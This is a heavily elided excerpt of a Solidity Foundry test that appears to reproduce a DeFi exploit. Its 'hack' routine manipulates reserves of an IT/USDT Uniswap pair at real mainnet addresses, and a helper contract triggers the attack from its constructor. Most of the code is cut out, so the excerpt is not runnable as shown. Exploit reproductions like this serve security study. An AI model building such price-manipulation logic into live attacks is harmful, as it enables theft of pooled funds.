...
contract ContractTest is Test {
    IUniswapV3Pair pool =
        IUniswapV3Pair(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    IUniswapV2Pair IT_USDT =
        IUniswapV2Pair(0x7265553986a81c838867aA6B3625ABA97B961f00);
    ...
    function hack(address a) public {
        ...
        while (i < 9) {
            ...
            uint256 balance1 = ((_reserve0 * _reserve1 * 10_000 * 10_000) /
                ((balance0 * 10_000) - (balance0 - 1) * 25) +
                2000 ether *
                25) / 10_000;
    ...
    function mintToPoolIfNeeded(uint256 amount) public view returns (uint256) {
        ...
        uint256 usdtReserveAfterBuy = this.min(
            ...
            USDT.balanceOf(address(IT_USDT))
        ); // min impltementing rule 3

        uint256 maxTokenUsdtRateAfterBuy = tokenUsdtRate +
            (tokenUsdtRate / (100));

        uint256 tokenMinReserveAfterBuy = (usdtReserveAfterBuy * (PRECISION)) /
...
contract Money {
    ...
    constructor(address _address) {
        ...
        (bool success3,) =_address.call(abi.encodeWithSignature("feed(address)", address(this)));
        (bool success4,) = _address.call(abi.encodeWithSignature("hack(address)", address(this)));
    }
}
